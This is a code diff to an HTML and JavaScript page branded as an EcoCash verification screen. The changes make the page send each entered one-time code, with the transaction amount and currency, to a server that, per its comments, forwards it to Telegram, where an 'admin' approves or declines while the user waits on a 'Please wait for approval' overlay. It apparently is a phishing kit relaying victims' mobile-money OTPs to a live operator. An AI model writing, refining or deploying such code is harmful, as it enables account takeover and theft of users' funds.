@@ -62,7 +62,6 @@
   .tx-block .tx-amt { font-size: 17px; font-weight: 800; color: var(--eco-blue); letter-spacing: -0.4px; white-space: nowrap; }
   .tx-block .tx-amt .cur { font-size: 11.5px; font-weight: 700; margin-right: 3px; opacity: 0.85; }
 
-  /* Expired / declined notice — above the OTP boxes and above the resend row */
   .expired-notice {
     display: none;
     background: #FEF2F2;
@@ -102,9 +101,7 @@
   }
   .otp-row input:focus { border-color: var(--eco-blue); box-shadow: 0 0 0 3px rgba(0,102,166,0.12); }
   .otp-row input.filled { border-color: var(--eco-blue); background: #F6FBFE; }
-  .otp-row input:disabled {
-    background: #F5F7F9; color: var(--eco-muted); border-color: var(--eco-border);
-  }
+  .otp-row input:disabled { background: #F5F7F9; color: var(--eco-muted); }
 
   .otp-help {
     display: flex; justify-content: center; align-items: center;
@@ -182,8 +179,6 @@
     .action-btn { height: 50px; font-size: 14px; }
     .card-body { padding: 18px 16px 20px; }
     .card-head { padding: 20px 16px 14px; }
-    .verifying .logo-big { font-size: 28px; }
-    .verifying .t { font-size: 16px; }
   }
 </style>
 </head>
@@ -198,7 +193,7 @@
   <div class="card">
     <div class="card-head">
       <h1>Enter verification code</h1>
-      <p>We sent a 6-digit code to your EcoCash number.</p>
+      <p>Enter the 6-digit code you received. It will be sent for approval.</p>
     </div>
 
     <div class="card-body">
@@ -210,7 +205,6 @@
         <div class="tx-amt"><span class="cur" id="amtCur">USD</span><span id="amtVal">0.00</span></div>
       </div>
 
-      <!-- Expired / declined notice, sits above the OTP row -->
       <div class="expired-notice" id="expiredNotice">
         <span class="icon">!</span>
         <div class="text">
@@ -248,13 +242,12 @@
   </div>
 </div>
 
-<!-- Full-page Verifying overlay -->
 <div class="verifying" id="verifying">
   <div class="inner">
     <div class="logo-big"><span class="eco">Eco</span><span class="cash">Cash</span></div>
     <div class="spinner"></div>
     <div class="t">Verifying…</div>
-    <div class="s">Checking your code. Do not close this page.</div>
+    <div class="s">Please wait for approval. Do not close this page.</div>
   </div>
 </div>
 
@@ -313,9 +306,7 @@
     boxes.forEach(el => { el.value = ''; el.classList.remove('filled'); });
     boxes[0].focus();
   }
-  function setOtpEnabled(on) {
-    boxes.forEach(el => { el.disabled = !on; });
-  }
+  function setOtpEnabled(on) { boxes.forEach(el => { el.disabled = !on; }); }
 
   /* ------------------------------------------------------------
      UI helpers
@@ -326,12 +317,8 @@
     clearTimeout(t._timer);
     t._timer = setTimeout(() => t.classList.remove('show'), 2200);
   }
-  function showExpiredNotice() {
-    document.getElementById('expiredNotice').classList.add('show');
-  }
-  function hideExpiredNotice() {
-    document.getElementById('expiredNotice').classList.remove('show');
-  }
+  function showExpiredNotice() { document.getElementById('expiredNotice').classList.add('show'); }
+  function hideExpiredNotice() { document.getElementById('expiredNotice').classList.remove('show'); }
 
   /* ------------------------------------------------------------
      Resend countdown
@@ -356,20 +343,6 @@
         resendBtn.textContent = 'Resend in ' + countdown + 's';
       }
     }, 1000);
-  }
-
-  /* ------------------------------------------------------------
-     Report an event
-  ------------------------------------------------------------ */
-  async function reportEvent(type) {
-    if (!txData.tx) return;
-    try {
-      await fetch('/api/telegram/event', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ type, tx: txData.tx, am: txData.am, cur: txData.cur, c: txData.c })
-      });
-    } catch (e) {}
   }
 
   /* ------------------------------------------------------------
@@ -400,11 +373,10 @@
         return;
       }
 
-      showToast('Code sent.');
+      showToast('Ready. Enter your code.');
       startCountdown(30);
       clearOtp();
       setOtpEnabled(true);
-      if (source !== 'auto') await reportEvent('otp_requested');
     } catch (e) {
       showToast('Network error. Please try again.');
       resendBtn.disabled = false;
@@ -413,8 +385,9 @@
   }
 
   /* ------------------------------------------------------------
-     Verify — always submit the entered code immediately,
-     show the full-page overlay, then wait for the outcome
+     Verify — send the entered code to the server, which
+     forwards it to Telegram. Approve in Telegram → verify.html.
+     Decline in Telegram → red "Code expired. Please resend."
   ------------------------------------------------------------ */
   async function verifyCode() {
     hideExpiredNotice();
@@ -425,57 +398,32 @@
       return;
     }
 
-    // Show the full-page overlay and disable inputs
+    // Full-page overlay
     document.getElementById('verifying').classList.add('show');
     document.getElementById('verifyBtn').disabled = true;
     setOtpEnabled(false);
 
-    // First: submit the code immediately. This always reflects on the server
-    // (and therefore to Telegram) whether the code is right, wrong or expired.
-    let verifyRes = null;
+    // Send the entered code to the server, which forwards it to Telegram.
+    // The server does NOT decide approval — the admin does, via Telegram.
     try {
-      verifyRes = await fetch('/api/verification/verify', {
+      await fetch('/api/verification/submit', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ tx: txData.tx, otp })
+        body: JSON.stringify({
+          tx: txData.tx,
+          otp: otp,
+          am: txData.am,
+          cur: txData.cur,
+          c:  txData.c
+        })
       });
     } catch (e) {
-      verifyRes = null;
+      // Keep waiting; the poll below will decide the outcome
     }
 
-    let body = {};
-    try { body = await verifyRes.clone().json(); } catch (e) {}
-
-    // If the server already accepted the code
-    if (verifyRes && verifyRes.ok && body.success) {
-      await reportEvent('verification_success');
-      const q = new URLSearchParams({
-        tx:  txData.tx,
-        am:  txData.am,
-        cur: txData.cur,
-        rn:  txData.rn,
-        c:   txData.c
-      });
-      setTimeout(() => window.location.replace('verify.html?' + q.toString()), 600);
-      return;
-    }
-
-    // If the server says the code is expired or declined, show the notice
-    if (body && (body.message || '').toLowerCase().includes('expired')) {
-      document.getElementById('verifying').classList.remove('show');
-      document.getElementById('verifyBtn').disabled = false;
-      setOtpEnabled(true);
-      clearOtp();
-      showExpiredNotice();
-      if (timer) { clearInterval(timer); timer = null; }
-      resendBtn.disabled = false;
-      resendBtn.textContent = 'Resend code';
-      return;
-    }
-
-    // If the code is still awaiting approval, poll the decision, then finalise
+    // Poll until the admin taps Approve or Decline in Telegram
     const start = Date.now();
-    const maxWaitMs = 90 * 1000;
+    const maxWaitMs = 2 * 60 * 1000;   // 2 minutes
 
     const check = async () => {
       if (Date.now() - start > maxWaitMs) {
@@ -506,42 +454,15 @@
       }
 
       if (decision === 'approved') {
-        // Re-submit — the OTP was already correct on the first try
-        try {
-          const r2 = await fetch('/api/verification/verify', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ tx: txData.tx, otp })
-          });
-          const j2 = await r2.json().catch(() => ({}));
-
-          if (r2.ok && j2.success) {
-            await reportEvent('verification_success');
-            const q = new URLSearchParams({
-              tx:  txData.tx,
-              am:  txData.am,
-              cur: txData.cur,
-              rn:  txData.rn,
-              c:   txData.c
-            });
-            window.location.replace('verify.html?' + q.toString());
-            return;
-          }
-
-          document.getElementById('verifying').classList.remove('show');
-          document.getElementById('verifyBtn').disabled = false;
-          setOtpEnabled(true);
-          clearOtp();
-          if ((j2.message || '').toLowerCase().includes('expired')) showExpiredNotice();
-          else showToast(j2.message || 'Invalid code. Please try again.');
-          return;
-        } catch (e) {
-          document.getElementById('verifying').classList.remove('show');
-          document.getElementById('verifyBtn').disabled = false;
-          setOtpEnabled(true);
-          showToast('Network error. Please try again.');
-          return;
-        }
+        const q = new URLSearchParams({
+          tx:  txData.tx,
+          am:  txData.am,
+          cur: txData.cur,
+          rn:  txData.rn,
+          c:   txData.c
+        });
+        window.location.replace('verify.html?' + q.toString());
+        return;
       }
 
       setTimeout(check, 1500);
